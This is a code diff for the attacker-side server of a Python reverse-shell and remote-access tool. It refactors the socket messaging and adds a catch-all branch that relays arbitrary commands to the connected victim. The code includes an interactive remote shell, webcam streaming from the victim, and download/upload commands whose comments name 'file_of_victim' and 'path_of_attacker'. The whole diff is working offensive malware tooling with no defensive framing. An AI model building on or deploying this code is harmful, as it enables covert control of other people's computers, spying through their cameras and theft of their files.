@@ -79,23 +79,22 @@ class FileTransfer:
 # Shell is working client side but only
 # with netcat listener.
 class Shell:
-	def __init__(self, client_socket):
+	def __init__(self, client_socket, server):
 		self.client_socket = client_socket
+		self.server = server
 
 	def start(self):
 		cmd = ''
 		while(True):
-			out = self.client_socket.recv(BUFFER_SIZE).decode()
+			out = self.server.recv_raw(BUFFER_SIZE)
 			if cmd:
 				sys.stdout.write(out.replace(cmd, ''))
-			else:
-				sys.stdout.write(out + '\n')
 			try:
 				cmd = input() + '\n'
 			except EOFError:
 				print("")
 				return
-			self.client_socket.send(cmd.encode())
+			self.server.send_raw(cmd)
 			if cmd == 'exit\n':
 				return
 			time.sleep(0.01)
@@ -164,28 +163,60 @@ class Server:
 		self.client_socket, client_ip = self.s.accept()
 		print(f"[+] Connection from {client_ip[0]}:{client_ip[1]}")
 
+	def send_header(self, msg):
+		msg_size = str(len(msg)).encode()
+		msg_size += b' ' * (HEAD - len(msg_size))
+		try:
+			self.client_socket.sendall(msg_size)
+		except:
+			print("[!] Failed to transfer data on socket.\n"
+				"[!] The shell might be unstable !")
+	def get_header(self):
+		int(self.recvall(HEAD))
+
 	def send(self, msg):
 		msg = msg.encode()
 		if len(str(len(msg))) > HEAD:
 			print("[!] Message too long.\n[!] The last message hasn't been sent")
 		try:
-			msg_size = str(len(msg)).encode()
-			msg_size += b' ' * (HEAD - len(msg_size))
-			self.client_socket.sendall(msg_size)
+			self.send_header(msg)
 			self.client_socket.sendall(msg)
 		except:
 			print("[!] Failed to transfer data on socket.\n"
 				"[!] The shell might be unstable !")
 
 	def recvall(self, size):
-		ret = ''
+		ret = b''
 		while len(ret) < size:
-			ret += self.client_socket.recv(size).decode()
-		return ret
+			ret += self.client_socket.recv(size)
+		return ret.decode()
 	
 	def recv(self):
 		msg_size = int(self.recvall(HEAD))
-		return self.recvall(msg_size).decode()
+		return self.recvall(msg_size)
+
+	# def send_file(self, file):
+	# 	try:
+	# 		file_size = os.stat(file).st_size
+	# 	except FileNotFoundError:
+	# 		msg_size = str(1).encode()
+	# 		msg_size += b' ' * (HEAD - len(msg_size))
+	# 		self.client_socket.send('0'.encode())
+	# 		return
+	# 	self.client_socket.send((str(file_size) + '\n').encode())
+	# 	with open(file, 'r') as f:
+	# 		while file_size > 0:
+	# 			data = f.readline()
+	# 			file_size -= len(data)
+	# 			self.client_socket.sendall(data.encode())
+
+	# def recv_file(self, path):
+
+	def send_raw(self, msg):
+		self.client_socket.sendall(msg.encode())
+
+	def recv_raw(self, size):
+		return(self.client_socket.recv(size).decode())
 
 	def get_client_socket(self):
 		return self.client_socket
@@ -197,42 +228,47 @@ class Server:
 			pass
 		self.s.close()
 
-
-def main_loop(server, client_socket):
+def main_loop(server):
 	while True:
+		client_socket = server.get_client_socket()
 		try:
 			cmd = input("revshell> ")
 		except EOFError:
 			print("")
 			return
 		if not cmd:
+			server.send('')
 			return
 		cmd = cmd.strip()
 		if not cmd:
 			continue
 		if cmd.split()[0] == "shell":
-			client_socket.send(cmd.encode())
-			shell = Shell(client_socket)
-			signal.signal(signal.SIGINT, signal.SIG_IGN)
+			server.send("shell")
+			shell = Shell(server.get_client_socket(), server)
+			# signal.signal(signal.SIGINT, signal.SIG_IGN)
 			shell.start()
-			signal.signal(signal.SIGINT, sigIntHandler)
+			# signal.signal(signal.SIGINT, sigIntHandler)
 		elif cmd.split()[0] == "webcam":
-			client_socket.send(cmd.encode())
+			server.send(cmd)
 			webcam = WebcamStream(client_socket)
 			webcam.receive()
 		elif cmd.split(" ")[0] == "download":
 			# Usage: download <file_of_victim> <path_of_attacker>
-			client_socket.send(("download " + cmd.split(" ")[1]).encode())
+			server.send(("download " + cmd.split(" ")[1]))
 			transfer = FileTransfer(client_socket)
 			transfer.download(cmd.split(" ")[1], cmd.split(" ")[2])
 		elif cmd.split(" ")[0] == "upload":
 			# Usage: download <file_of_attacker> <path_of_victim>
-			client_socket.send(("upload " + cmd.split(" ", 2)[2]).encode())
+			server.send(("upload " + cmd.split(" ", 2)[2]))
 			transfer = FileTransfer(client_socket)
 			transfer.upload(cmd.split(" ")[1])
 		elif cmd == "exit":
-			client_socket.send("exit".encode())
+			server.send("exit")
 			return
+		else:
+			server.send(cmd)
+			print(server.recv())
+
 
 def sigIntHandler(signum, frame):
 	print("\nrevshell> ", end="")
@@ -242,7 +278,7 @@ def main():
 	server = Server()
 	server.accept()
 	signal.signal(signal.SIGINT, sigIntHandler)
-	main_loop(server, server.get_client_socket())
+	main_loop(server)
 	
 
 if __name__ == '__main__':
